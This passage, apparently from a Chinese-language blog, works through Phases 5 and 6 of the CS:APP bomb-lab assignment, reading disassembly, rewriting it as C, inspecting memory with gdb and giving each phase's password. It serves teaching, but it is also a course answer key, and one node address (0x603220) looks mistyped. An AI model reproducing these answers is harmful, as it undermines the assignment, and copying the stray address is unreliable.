c4 20             add    $0x20,%rsp</span><br><span class="line"> 4010f2:   5b                      pop    %rbx</span><br><span class="line"> 4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>401067: <code>mov %rdi,%rbx</code> 将 %rdi 寄存器上保存的地址传给了 %rbx 寄存器。</p>
<blockquote>
<p>%rbx = %rdi = input</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line"> ...</span><br><span class="line"> 40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line"> 401071:   00 00</span><br><span class="line"> 401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line"> ...</span><br><span class="line"> 4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line"> 4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line"> 4010e5:   00 00</span><br><span class="line"> 4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line"> 4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line"> 4010f2:   5b                      pop    %rbx</span><br><span class="line"> 4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>这里的 <code>%fs:0x28</code> 是 FS 段寄存器（segment register）上偏移地址 <code>0x28</code> 上的数据。这是一个随机量，在这里起到 stack canary 的作用 。这部分代码即利用这个 stack canary 来确保 <code>0x18(%rsp)</code> 的数值（即栈底的 8 bytes）在函数前后没有发生改动，如果发生改动则执行 4010e9: <code>callq 400b30 &lt;__stack_chk_fail@plt&gt;</code> 调用系统函数 <code>__stack_chk_fail</code> 跳出，从而防止栈溢出（stack overflow）的问题。事实上，这段代码与本关的关系不大，这里就不做更多阐述了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12345  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">40107f:   83 f8 06                cmp    $0x6,%eax</span><br><span class="line">401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>401078: <code>xor %eax,%eax</code> 将 %eax 寄存器设置为 <code>0</code>。</p>
<blockquote>
<p>%eax = 0</p>
</blockquote>
<p>40107a: <code>callq 40131b</code> 调用函数 <code>string_length</code>。由 1.2.4 节的分析，函数 <code>string_length</code> 的返回值就是字符串 <code>input</code> 的长度。</p>
<p>40107f: <code>cmp $0x6,%eax</code> 和 401082: <code>je 4010d2</code> 判断返回值是否为 <code>6</code>，是则直接跳到 4010d2: <code>mov $0x0,%eax</code>，否则执行 401084: <code>callq 40143a</code> 引爆炸弹。</p>
<p>可见，输入的字符串的长度应当为 <code>6</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line">401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line">401096:   83 e2 0f                and    $0xf,%edx</span><br><span class="line">401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi</span><br><span class="line">4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>剩下的内容也就是本关的主体部分。直观起见，试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cur_char = <span class="number">0</span>;                                   <span class="comment">// cur_char in %rcx</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; ++i) &#123;                      <span class="comment">// i in %rax</span></span><br><span class="line">    cur_char = input[i];                        <span class="comment">// input in %rbx</span></span><br><span class="line">    index    = cur_char;                        <span class="comment">// index in %rsp, later copied to %edx</span></span><br><span class="line">    index &amp;= <span class="number">0xf</span>;</span><br><span class="line">    target_char = target[index];                <span class="comment">// target_char in %edx, target in 0x4024b0</span></span><br><span class="line">    <span class="keyword">word</span>[i]     = target_char;                  <span class="comment">// word in %rsp + 0x10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">word</span>[<span class="number">6</span>] = <span class="string">'\0'</span>;</span><br><span class="line">result  = strings_not_equal(<span class="keyword">word</span>, <span class="number">0x40245e</span>);    <span class="comment">// result in %eax</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>)</span><br><span class="line">    explode_bomb();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>其中，由 1.2.5 节的分析，函数 <code>strings_not_equal</code> 的作用为检查两个字符串是否相等，是则返回 <code>0</code>，否则返回 <code>1</code>。同时也可以知道 <code>0x40245e</code> 这个地址指向的是一个字符串。</p>
<p>可见，这段代码的作用为：</p>
<ol>
<li>构造一个 6 位的新字符串 <code>word</code>，遍历输入的字符串 <code>input</code> 的 6 个字符，以字符 <code>input[i]</code> 的最低 4 位二进制数为索引 <code>index</code>，依次将 <code>word[i]</code> 设置为字符 <code>target[index]</code>（可以推测出 <code>0x4024b0</code> 这个地址指向的也是一个字符串，这里设为 <code>target</code>），最后将 <code>word[6]</code> 设置为 <code>'\0'</code> 作为字符串结束符；</li>
<li>检查字符串 <code>word</code> 和 <code>0x40245e</code> 指向的字符串是否相等，是则直接返回，否则引爆炸弹。</li>
</ol>
<p>因此，由 <code>0x40245e</code> 指向的字符串倒推得对应的 6 个索引 <code>index</code>，再根据这些 <code>index</code> 得到输入的字符串 <code>input</code> 的 6 个字符，就可以得到本关的密码。</p>
<h5 id="522-确定目标字符串-word-的值"><a class="markdownIt-Anchor" href="#522-确定目标字符串-word-的值"></a> 5.2.2 确定目标字符串 word 的值</h5>
<p>使用 gdb 查看地址 <code>0x40245e</code> 存放的内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/s <span class="number">0x40245e</span></span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>
<p>这就是我们需要构造的目标字符串 <code>word</code> 的值。</p>
<h5 id="523-确定-6-个索引-index-的值"><a class="markdownIt-Anchor" href="#523-确定-6-个索引-index-的值"></a> 5.2.3 确定 6 个索引 index 的值</h5>
<p>使用 gdb 查看地址 <code>0x4024b0</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x4024b0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure>
<p>这就是字符串 <code>target</code> 的值，我们需要将 <code>word[i]</code> 分别设置为字符 <code>target[index]</code>。于是得到对应的 6 个 <code>index</code> 的值为：<code>0x9</code>, <code>0xf</code>, <code>0xe</code>, <code>0x5</code>, <code>0x6</code>, <code>0x7</code>（<code>index</code> 是 4 位二进制数，因此其取值范围为 [0x0, 0xf]）。</p>
<h5 id="524-确定输入的-6-个字符"><a class="markdownIt-Anchor" href="#524-确定输入的-6-个字符"></a> 5.2.4 确定输入的 6 个字符</h5>
<p>由于索引 <code>index</code> 是字符 <code>input[i]</code> 的最后 4 位（二进制），通过 ASCII 码表 [^6] 找到最后 4 位为 <code>index</code> 的字符即可。于是得到对应的 6 个字符为：<code>9</code>, <code>O</code>, <code>N</code>, <code>5</code>, <code>6</code>, <code>7</code>（答案不唯一，这里就不一一列举了）。</p>
<p>因此，本关密码即为 <code>9ON567</code>。</p>
<h5 id="525-测试"><a class="markdownIt-Anchor" href="#525-测试"></a> 5.2.5 测试</h5>
<p>在 gdb 中输入 Phase 5 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9ON567</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Good work!  On to the next...</span><br></pre></td></tr></table></figure>
<h3 id="6-phase-6-linked-lists-pointers-structs"><a class="markdownIt-Anchor" href="#6-phase-6-linked-lists-pointers-structs"></a> 6. Phase 6: linked lists / pointers / structs</h3>
<h4 id="61-本关密码"><a class="markdownIt-Anchor" href="#61-本关密码"></a> 6.1 本关密码</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<h4 id="62-解题过程"><a class="markdownIt-Anchor" href="#62-解题过程"></a> 6.2 解题过程</h4>
<blockquote>
<p>%rdi = input</p>
</blockquote>
<h5 id="620-观察函数-phase_6"><a class="markdownIt-Anchor" href="#620-观察函数-phase_6"></a> 6.2.0 观察函数 phase_6</h5>
<p>在 bomb.asm 中找到函数 <code>phase_6</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_6&gt;:</span><br><span class="line"> 4010f4:   41 56                   push   %r14</span><br><span class="line"> 4010f6:   41 55                   push   %r13</span><br><span class="line"> 4010f8:   41 54                   push   %r12</span><br><span class="line"> 4010fa:   55                      push   %rbp</span><br><span class="line"> 4010fb:   53                      push   %rbx</span><br><span class="line"> 4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line"> 401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line"> 401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line"> 401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line"> 40110b:   49 89 e6                mov    %rsp,%r14</span><br><span class="line"> 40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line"> 401114:   4c 89 ed                mov    %r13,%rbp</span><br><span class="line"> 401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line"> 40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line"> 40111e:   83 f8 05                cmp    $0x5,%eax</span><br><span class="line"> 401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line"> 401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401128:   41 83 c4 01             add    $0x1,%r12d</span><br><span class="line"> 40112c:   41 83 fc 06             cmp    $0x6,%r12d</span><br><span class="line"> 401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line"> 401132:   44 89 e3                mov    %r12d,%ebx</span><br><span class="line"> 401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line"> 401138:   8b 04 84                mov    (%rsp,%rax,4),%eax</span><br><span class="line"> 40113b:   39 45 00                cmp    %eax,0x0(%rbp)</span><br><span class="line"> 40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line"> 401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line"> 401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line"> 40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line"> 40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line"> 401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line"> 401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line"> 401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line"> 40115b:   b9 07 00 00 00          mov    $0x7,%ecx</span><br><span class="line"> 401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line"> 401162:   2b 10                   sub    (%rax),%edx</span><br><span class="line"> 401164:   89 10                   mov    %edx,(%rax)</span><br><span class="line"> 401166:   48 83 c0 04             add    $0x4,%rax</span><br><span class="line"> 40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line"> 40116f:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line"> 401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line"> 401176:   48 8b 52 08             mov    0x8(%rdx),%rdx</span><br><span class="line"> 40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line"> 40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line"> 40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"> 401183:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line"> 40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line"> 401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line"> 401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"> 401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx</span><br><span class="line"> 40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line"> 40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line"> 4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> 4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line"> 4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line"> 4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line"> 4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line"> 4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line"> 4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line"> 4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line"> 4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line"> 4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"> 4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line"> 4011d9:   00</span><br><span class="line"> 4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line"> 4011df:   48 8b 43 08             mov    0x8(%rbx),%rax</span><br><span class="line"> 4011e3:   8b 00                   mov    (%rax),%eax</span><br><span class="line"> 4011e5:   39 03                   cmp    %eax,(%rbx)</span><br><span class="line"> 4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line"> 4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line"> 4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line"> 4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line"> 4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line"> 4011fb:   5b                      pop    %rbx</span><br><span class="line"> 4011fc:   5d                      pop    %rbp</span><br><span class="line"> 4011fd:   41 5c                   pop    %r12</span><br><span class="line"> 4011ff:   41 5d                   pop    %r13</span><br><span class="line"> 401201:   41 5e                   pop    %r14</span><br><span class="line"> 401203:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>发现这段代码相当长，所以这里就不逐句分析了，直接逆向工程。</p>
<h5 id="621-第一部分4010f4-~-40110b"><a class="markdownIt-Anchor" href="#621-第一部分4010f4-~-40110b"></a> 6.2.1 第一部分（4010f4 ~ 40110b）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010f4:   41 56                   push   %r14</span><br><span class="line">4010f6:   41 55                   push   %r13</span><br><span class="line">4010f8:   41 54                   push   %r12</span><br><span class="line">4010fa:   55                      push   %rbp</span><br><span class="line">4010fb:   53                      push   %rbx</span><br><span class="line">4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line">401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">40110b:   49 89 e6                mov    %rsp,%r14</span><br></pre></td></tr></table></figure>
<p>首先读入 6 个整数（详见 2.2.2 节），保存到栈中。</p>
<blockquote>
<p>%rsi = %r13 = %r14 = %rsp<br>
0x00(%rsp) = nums[0]<br>
0x04(%rsp) = nums[1]<br>
0x08(%rsp) = nums[2]<br>
0x0c(%rsp) = nums[3]<br>
0x10(%rsp) = nums[4]<br>
0x14(%rsp) = nums[5]</p>
</blockquote>
<p>其中，<code>nums[0]</code> ~ <code>nums[5]</code> 表示输入的字符串中解析得到的（前）6 个整数。</p>
<h5 id="622-第二部分40110e-~-401151"><a class="markdownIt-Anchor" href="#622-第二部分40110e-~-401151"></a> 6.2.2 第二部分（40110e ~ 401151）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line">401114:   4c 89 ed                mov    %r13,%rbp</span><br><span class="line">401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line">40111e:   83 f8 05                cmp    $0x5,%eax</span><br><span class="line">401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:   41 83 c4 01             add    $0x1,%r12d</span><br><span class="line">40112c:   41 83 fc 06             cmp    $0x6,%r12d</span><br><span class="line">401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:   44 89 e3                mov    %r12d,%ebx</span><br><span class="line">401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line">401138:   8b 04 84                mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:   39 45 00                cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line">401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line">40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line">401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cur_pos = nums;                              // cur_pos in %r13, nums in %rsp</span></span><br><span class="line">next_index = <span class="number">0</span>;                                 <span class="comment">// next_index in %r12d</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    cur_num = *cur_pos;                         <span class="comment">// cur_pos in %r13, later copied to %rbp</span></span><br><span class="line">    <span class="keyword">if</span> (--cur_num &gt; <span class="number">5</span>)                          <span class="comment">// cur_num in %eax</span></span><br><span class="line">        explode_bomb();</span><br><span class="line">    ++next_index;</span><br><span class="line">    <span class="keyword">if</span> (next_index == <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = next_index; i &lt;= <span class="number">5</span>; ++i) &#123;         <span class="comment">// i in %ebx, later copied to %rax</span></span><br><span class="line">        next_num = nums[i];                     <span class="comment">// next_num in %eax</span></span><br><span class="line">        <span class="keyword">if</span> (next_num == *cur_pos)</span><br><span class="line">            explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">    ++cur_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这段代码，可以得知输入的 6 个整数需要满足以下条件：</p>
<ol>
<li>减 1 后不能超过 <code>5</code>（无符号数），即其取值范围为 [1, 6]；</li>
<li>必须互不相同。</li>
</ol>
<p>因此，这 6 个整数是 1 ~ 6 的一个全排列。</p>
<h5 id="623-第三部分401153-~-40116d"><a class="markdownIt-Anchor" href="#623-第三部分401153-~-40116d"></a> 6.2.3 第三部分（401153 ~ 40116d）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line">40115b:   b9 07 00 00 00          mov    $0x7,%ecx</span><br><span class="line">401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line">401162:   2b 10                   sub    (%rax),%edx</span><br><span class="line">401164:   89 10                   mov    %edx,(%rax)</span><br><span class="line">401166:   48 83 c0 04             add    $0x4,%rax</span><br><span class="line">40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">begin_pos &#x3D; rsp;                             &#x2F;&#x2F; begin_pos in %r14</span><br><span class="line">end_pos &#x3D; rsp + 6;                              &#x2F;&#x2F; end_pos in %rsi</span><br><span class="line">minuend &#x3D; 7;                                    &#x2F;&#x2F; minuend in %ecx</span><br><span class="line">for (i &#x3D; begin_pos; i !&#x3D; end_pos; ++i) &#123;        &#x2F;&#x2F; i in %rax</span><br><span class="line">    new_num &#x3D; minuend - *i;                     &#x2F;&#x2F; new_num in %edx</span><br><span class="line">    *i      &#x3D; new_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，保存在栈中的这 6 个整数 <code>nums[i]</code> 被依次修改成了 <code>7 - nums[i]</code>。</p>
<h5 id="624-第四部分40116f-~-4011a9"><a class="markdownIt-Anchor" href="#624-第四部分40116f-~-4011a9"></a> 6.2.4 第四部分（40116f ~ 4011a9）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40116f:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line"> 401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line"> 401176:   48 8b 52 08             mov    0x8(%rdx),%rdx</span><br><span class="line"> 40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line"> 40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line"> 40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"> 401183:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line"> 40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line"> 401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line"> 401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"> 401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx</span><br><span class="line"> 40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line"> 40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line"> 4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>这是本关的主体部分。试译成 C 语言代码（经整理及大量不影响原意的改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; ++i) &#123;          <span class="comment">// i in %rsi</span></span><br><span class="line">    cur_num = nums[i];              <span class="comment">// cur_num in %ecx, nums in %rsp</span></span><br><span class="line">    p_node  = <span class="number">0x6032d0</span>;             <span class="comment">// p_node in %edx</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; cur_num; ++j)   <span class="comment">// j in %eax</span></span><br><span class="line">        p_node = *(++p_node);       <span class="comment">// assure that p_node is always a pointer</span></span><br><span class="line">    ptrs[i] = p_node;               <span class="comment">// ptrs in %rsp + 0x20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，根据被修改后的这 6 个整数 <code>nums[i]</code>，这段代码在 <code>ptrs[i]</code>（即 <code>*(%rsp + 0x20 + i * 0x8)</code>）中存放经过 <code>nums[i] - 1</code> 次 <code>p_node = *(++p_node);</code> 操作的地址 <code>p_node</code>，其中 <code>p_node</code> 的初始值为 <code>0x6032d0</code>。</p>
<p>可以看出这实际就是将链表的 6 个结点以 <code>nums[i]</code> 为索引顺序存到栈中。每次操作就是将 <code>p_node</code> 指向下一个结点，因此经过 <code>nums[i] - 1</code> 次操作得到的 <code>p_node</code> 就是 <code>nums[i]</code> 号结点的地址 <code>p_node(nums[i])</code>。</p>
<blockquote>
<p>ptrs[i] = p_node(nums[i])</p>
</blockquote>
<p>由之前的分析，<code>nums[i]</code> 是 1 ~ 6 的一个全排列，由此可以得到这 6 个结点的地址。</p>
<p>以进行 1 次操作为例，使用 gdb 查看此时 <code>p_node</code> 的值（原 <code>p_node</code> + <code>0x8</code> 所指向的内容）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;xw 0x6032d8</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6032d8 &lt;node1+8&gt;:     0x006032e0</span><br></pre></td></tr></table></figure>
<p>这就是 2 号结点的地址 <code>p_node2</code>。</p>
<p>用同样的方式得到 6 个结点的地址：</p>
<blockquote>
<p>p_node1 = 0x6032d0<br>
p_node2 = 0x6032e0<br>
p_node3 = 0x6032f0<br>
p_node4 = 0x603300<br>
p_node5 = 0x603310<br>
p_node6 = 0x603220</p>
</blockquote>
<h5 id="625-第五部分4011ab-~-4011d0"><a class="markdownIt-Anchor" href="#625-第五部分4011ab-~-4011d0"></a> 6.2.5 第五部分（4011ab ~ 4011d0）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> 4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line"> 4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line"> 4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line"> 4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line"> 4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line"> 4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line"> 4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line"> 4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line"> 4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"> 4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line"> 4011d9:   00</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
